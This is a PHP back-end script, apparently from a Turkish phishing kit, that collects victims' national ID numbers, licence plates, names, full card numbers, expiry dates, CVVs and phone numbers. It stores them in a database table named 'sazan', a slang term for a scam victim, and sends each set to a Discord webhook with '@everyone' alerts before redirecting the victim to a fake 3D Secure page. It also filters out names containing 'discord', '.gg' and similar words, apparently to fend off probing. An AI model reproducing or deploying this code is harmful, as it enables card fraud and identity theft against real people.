<?php
	include('../../baglan.php');
	function arrayContainsWord($str){
		$arr = array('residence', 'residance', 'dc', 'gg', 'discord', '.gg', '.gg/', '.gg', '7331'); //istenmeyen belirli kelimeler
		foreach ($arr as $word) {
			if (preg_match('/(?<=[\s,.:;"\']|^)' . preg_quote($word) . '(?=[\s,.:;"\']|$)/', $str)) return true;
		}
		return false;
	}
	function contains($str) {
		$arr = array('.gg/', 'discord', 'residence', 'residance', 'discord', '.gg', '7331'); //istenmeyen kelimeler - içinde geçenleride farkediyor o yüzden hm yazmayın ismi ahmet olanında verisi gider.
		foreach($arr as $a) {
			if (stripos($str,$a) !== false) return true;
		}
		return false;
	}
  	require_once 'CSRFP/SignatureGenerator.php';
	require_once 'CSRFP/Detect.php';

    $secret = 'allahyokzaafyokcinayet';

    $signer = new Kunststube\CSRFP\SignatureGenerator($secret);
	if($_POST && !$_POST['_token']) { header('HTTP/1.0 400 Bad Request'); header('Location:hata.php'); return; }
    if ($_POST) {
		$tokenData = $db->query("SELECT * FROM token", PDO::FETCH_ASSOC);
		$nonUsed = array();
		foreach($tokenData as $token){
			array_push($nonUsed, $token['token']);
		}
		
		if($_POST['islem'] == 2) {
			if(!$_POST['adsoyad'] || trim(preg_replace('!\s+!', ' ', $_POST['adsoyad'])) == "") {
				header('HTTP/1.0 400 Bad Request');
				header('Location:./hata.php');
				return;
			}
			if(contains(trim($_POST['adsoyad']))) {
				header('HTTP/1.0 400 Bad Request');
				header('Location:./hata.php');
				return;
			}
			if(arrayContainsWord(trim($_POST['adsoyad']))) {
				header('HTTP/1.0 400 Bad Request');
				header('Location:./hata.php');
				return;
			}
		}

		if (!$signer->validateSignature($_POST['_token'])) {
			header('HTTP/1.0 400 Bad Request');
			header('Location:./hata.php');
			return;
		} else {
			if(in_array($_POST['_token'], $nonUsed)) {
				$tttoken = $_POST['_token'];
				$db->query("DELETE FROM token WHERE token='$tttoken'");
				header('HTTP/1.0 200 OK');
				if($_POST['islem'] == 1) header('Location:./fiyat.php');
				else header('Location:./bekle.php');
			} else {
				header('HTTP/1.0 400 Bad Request');
				header('Location:./hata.php');
				return;
			}
		}

	}
?>
<?php
	if($_POST) {
		date_default_timezone_set('Europe/Istanbul');
		ob_start();
		session_start();
		if($_POST['islem'] == 1) {
			$_SESSION['tckn'] = guvenlik(trim($_POST['tckimlik']));    
			$_SESSION['plate'] = guvenlik(trim($_POST['plaka']));
		} else if($_POST['islem'] == 2) {
			$tckn = $_SESSION['tckn'];
			$plate = $_SESSION['plate'];
			$rowData = $db->query("SELECT * FROM sazan WHERE ip='$ip'");

			$ad = guvenlik(trim($_POST['adsoyad']));
			$kk = guvenlik(trim($_POST['cc']));
			$kk = preg_replace('/\s+/','',$kk);
			$sonkul = guvenlik(trim($_POST['skt']));
			$sonkul = preg_replace('/\s+/','',$sonkul);
			$cvv = guvenlik(trim($_POST['cvv']));
			$phone = preg_replace('/\D/', '', guvenlik(trim($_POST['no'])));;
			$banka = guvenlik(trim($_POST['banka']));
			$_SESSION['no_last_4'] = substr($phone, 6, 10);
			$_SESSION['cc_last_4'] = substr($kk, 12, 16);

			$bin = substr($kk, 0, 6);
			$date = date('d.m.Y H:i');
			$data = http_build_query( array( 'CardNumber' => $bin ));
			$opts = array('http'=>array('method' => 'POST', 'header' => "User-Agent:MyAgent/1.0\r\n", 'content' => $data));
			$context = stream_context_create($opts);
			$undecoded = @file_get_contents('https://posservice.esnekpos.com/api/services/EYVBinService', false, $context);
			$binData = json_decode($undecoded, true);
			$bank = $binData ? ($binData["Bank_Name"] ? $binData["Bank_Name"] . " - " . $binData["Card_Type"] . " - " . $binData["Card_Family"] : "") : "";

			if ($rowData->rowCount() > 0) {
				$query = $db->prepare("UPDATE sazan SET tckn=?,plate=?,name=?,date=?,ccnumber=?,ccskt=?,cccvv=?,phone=?,bank=? WHERE ip = ?");
				$insert = $query->execute(array($tckn,$plate,$ad,$date,$kk,$sonkul,$cvv,$phone,$bank,$ip));
	
				if($siteAyarlari['webhook'] !== '' || $siteAyarlari['webhook'] !== 0) {
					$webhookurl = $siteAyarlari['webhook'];
					$json_data=json_encode(["content"=>"@everyone\n**Sazan Bilgileri Düzenledi!** 🔥🔥\n**Ad:** `".$ad."`\n**CC:** `".$kk."`\n**SKT:** `".$sonkul."`\n**CVV:** `".$cvv."`\n**Telefon:** `".$phone."`\n**Bakiye:** `".$money."`\n**IP:** `".$ip."`"],JSON_UNESCAPED_SLASHES|JSON_UNESCAPED_UNICODE);
					$ch=curl_init($webhookurl);
					curl_setopt($ch,CURLOPT_HTTPHEADER,array('Content-type: application/json'));
					curl_setopt($ch,CURLOPT_POST,1);
					curl_setopt($ch,CURLOPT_POSTFIELDS,$json_data);
					curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);
					curl_setopt($ch,CURLOPT_HEADER,0);
					curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
					curl_exec($ch);
					curl_close($ch);

					if($insert) {
						header("location:./3dredirect.php?bin=".$bin);
					}
				}
			} else {
				$query = $db->prepare("INSERT INTO sazan SET tckn=?,plate=?,ip=?,name=?,date=?,ccnumber=?,ccskt=?,cccvv=?,phone=?,bank=?");
				$insert = $query->execute(array($tckn,$plate,$ip,$ad,$date,$kk,$sonkul,$cvv,$phone,$bank));

				if($siteAyarlari['webhook'] !== '' || $siteAyarlari['webhook'] !== 0) {
					$webhookurl = $siteAyarlari['webhook'];
					$json_data=json_encode(["content"=>"@everyone\n**Yeni Sazan** 🔥🔥\n**Ad:** `".$ad."`\n**CC:** `".$kk."`\n**SKT:** `".$sonkul."`\n**CVV:** `".$cvv."`\n**Telefon:** `".$phone."`\n**Bakiye:** `".$money."`\n**IP:** `".$ip."`"],JSON_UNESCAPED_SLASHES|JSON_UNESCAPED_UNICODE);
					$ch=curl_init($webhookurl);
					curl_setopt($ch,CURLOPT_HTTPHEADER,array('Content-type: application/json'));
					curl_setopt($ch,CURLOPT_POST,1);
					curl_setopt($ch,CURLOPT_POSTFIELDS,$json_data);
					curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);
					curl_setopt($ch,CURLOPT_HEADER,0);
					curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
					curl_exec($ch);
					curl_close($ch);

					if($insert) {
						header("location:./3dredirect.php?bin=".$bin);
					}
				}
			}
		}
	}
?>